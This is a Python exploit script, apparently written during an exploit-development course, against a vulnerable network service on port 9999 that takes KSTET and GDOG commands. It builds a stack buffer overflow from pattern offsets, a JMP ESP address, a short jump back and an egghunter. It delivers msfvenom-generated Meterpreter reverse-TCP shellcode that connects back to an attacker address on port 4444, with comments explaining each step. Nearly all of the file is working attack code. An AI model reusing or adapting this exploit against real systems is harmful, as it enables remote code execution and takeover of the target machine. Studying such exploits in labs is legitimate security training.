# Author: Uday Mittal
# Company: Yaksas CSC
# Contact: csc@yaksas.in | twitter.com/yaksas443

import sys
import socket

#Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A

#evilString = "A" * 700
evilString = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A"
#root@kali-rolling-amd64:~/Documents/exploitdev-udemy# msf-pattern_offset -q 63413363
#[*] Exact match at offset 70
evilString = "A" * 70 + "B" * 4 + "C" * (700-74)
# 626011c7 is the return address given by jmpcall
# \xc7\x11\x60\x62

# Search for instruction on executing short jump back 90 bytes to move back
#nasm > jmp $-90
#00000000  EBA4              jmp short 0xffffffa6
# We later learned that it jumped back too far before the start of the egghunterfer in the EAX register so we adjust the jmp to 70 bytes instead to land directly in EAX register
#nasm > jmp $-70
#00000000  EBB8              jmp short 0xffffffba


# With proper JMP ESP instruction, now additional jmps can be fed directly after.
# Remember that after you jump to ESP, you can feed jmp commands directly without little-endianizing the hex value, which only is applied to the memory address fed into EIP

# The author made a error  for the jmp esp address, it's \x50 not \x60

shellcode = "A" * 1000

evilString = "A" * 70 + "\xc7\x11\x50\x62" + "\xEB\xB8\x90\x90" + "C" * 150

# The A's are replaced with a nop sled of the same length. Clearly the GDOG command is meant to cause the registers to absorb it in a different way, he should have explained us this but he didn't
evilString = "\x90" * 70 + "\xc7\x11\x50\x62" + "\xEB\xB8\x90\x90" + "C" * 150
# pattern create #2
# Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
shellcode = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
# egghunter set to w00tw00t from command msf-egghunter -f python -e w00tw00t
egghunter =  b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
egghunter += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
egghunter += b"\xea\xaf\x75\xe7\xff\xe7"

#root@kali-rolling-amd64:~/Documents/exploitdev-udemy# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.84 LPORT=4444 -b '\x00' -f python
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 11 compatible encoders
#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
#x86/shikata_ga_nai succeeded with size 368 (iteration=0)
#x86/shikata_ga_nai chosen with final size 368
#Payload size: 368 bytes
#Final size of python file: 1802 bytes
buf =  b""
buf += b"\xbd\xb5\xde\xfc\xcb\xda\xc9\xd9\x74\x24\xf4\x5b\x33"
buf += b"\xc9\xb1\x56\x31\x6b\x13\x03\x6b\x13\x83\xc3\xb1\x3c"
buf += b"\x09\x37\x51\x42\xf2\xc8\xa1\x23\x7a\x2d\x90\x63\x18"
buf += b"\x25\x82\x53\x6a\x6b\x2e\x1f\x3e\x98\xa5\x6d\x97\xaf"
buf += b"\x0e\xdb\xc1\x9e\x8f\x70\x31\x80\x13\x8b\x66\x62\x2a"
buf += b"\x44\x7b\x63\x6b\xb9\x76\x31\x24\xb5\x25\xa6\x41\x83"
buf += b"\xf5\x4d\x19\x05\x7e\xb1\xe9\x24\xaf\x64\x62\x7f\x6f"
buf += b"\x86\xa7\x0b\x26\x90\xa4\x36\xf0\x2b\x1e\xcc\x03\xfa"
buf += b"\x6f\x2d\xaf\xc3\x40\xdc\xb1\x04\x66\x3f\xc4\x7c\x95"
buf += b"\xc2\xdf\xba\xe4\x18\x55\x59\x4e\xea\xcd\x85\x6f\x3f"
buf += b"\x8b\x4e\x63\xf4\xdf\x09\x67\x0b\x33\x22\x93\x80\xb2"
buf += b"\xe5\x12\xd2\x90\x21\x7f\x80\xb9\x70\x25\x67\xc5\x63"
buf += b"\x86\xd8\x63\xef\x2a\x0c\x1e\xb2\x22\xe1\x13\x4d\xb2"
buf += b"\x6d\x23\x3e\x80\x32\x9f\xa8\xa8\xbb\x39\x2e\xb9\xac"
buf += b"\xb9\xe0\x01\xbc\x47\x01\x71\x94\x83\x55\x21\x8e\x22"
buf += b"\xd6\xaa\x4e\xca\x03\x46\x45\x5c\x6c\x3e\x23\xf2\x04"
buf += b"\x3c\xd4\x1b\x89\xc9\x32\x4b\x61\x99\xea\x2c\xd1\x59"
buf += b"\x5b\xc5\x3b\x56\x84\xf5\x43\xbd\xad\x9c\xab\x6b\x85"
buf += b"\x08\x55\x36\x5d\xa8\x9a\xed\x1b\xea\x11\x07\xdb\xa5"
buf += b"\xd1\x62\xcf\xd2\x85\x8c\x0f\x23\x20\x8c\x65\x27\xe2"
buf += b"\xdb\x11\x25\xd3\x2b\xbe\xd6\x36\x28\xb9\x29\xc7\x18"
buf += b"\xb1\x1c\x5d\x24\xad\x60\xb1\xa4\x2d\x37\xdb\xa4\x45"
buf += b"\xef\xbf\xf7\x70\xf0\x15\x64\x29\x65\x96\xdc\x9d\x2e"
buf += b"\xfe\xe2\xf8\x19\xa1\x1d\x2f\x1a\xa6\xe1\xad\x35\x0f"
buf += b"\x89\x4d\x06\xaf\x49\x24\x86\xff\x21\xb3\xa9\xf0\x81"
buf += b"\x3c\x60\x59\x89\xb7\xe5\x2b\x28\xc7\x2f\xed\xf4\xc8"
buf += b"\xdc\x36\x07\xb2\xad\xc9\xe8\x43\xa4\xad\xe9\x43\xc8"
buf += b"\xd3\xd6\x95\xf1\xa1\x19\x26\x46\xb9\x2c\x0b\xef\x50"
buf += b"\x4e\x1f\xef\x70"

shellcode = "w00tw00t" + "A" * 1000
shellcode = "w00tw00t" + buf
# We subtract the size of the egghunter from the nop sled and then we add padding of 18 bytes of nop sped before the egghunter and 20 byte nop sled after the egghunter, which then is followed by jmp esp and then short jmp 70 and 150 C's
evilString = "\x90" * 18 + egghunter + "\x90"*20 + "\xc7\x11\x50\x62" + "\xEB\xB8\x90\x90" + "C" * 150

JMP_ESP = "\xc7\x11\x50\x62"
SHORT_JUMPBACK_70 = "\xEB\xB8\x90\x90"

evilString = "\x90" * 18 + egghunter + "\x90"*20 + JMP_ESP + SHORT_JUMPBACK_70 + "C"*150
# author customized command for teaching purposes
command1 = "GDOG " + shellcode
# Finally we identified only one bad character after bruting all possible combinations and observing how they are rendered in the debugger \x00
# The null byte \x00

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# first send in the shellcode where we know lands where ESP is pointing at
s.connect(('192.168.122.125',9999))
s.recv(1024)
s.send(command1)
s.close()

# Then send in the evilString where we store our egghunter, our hijack EIP instruction, and a jump-back of 70 bytesto reach our egghunter to set off the payload
command2 = "KSTET " + evilString

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(('192.168.122.125',9999))
s.recv(1024)
s.send(command2)
s.close()

# At this time, execution continues as normal until we hit our overwritten EIP with JUMP to ESP instruction, it then has a jump-back of 70 bytes to hit and execute our egghunter. Egghunter hijacks CPU instructions and searches for the egg in our Virtual Address Space and executes the payload
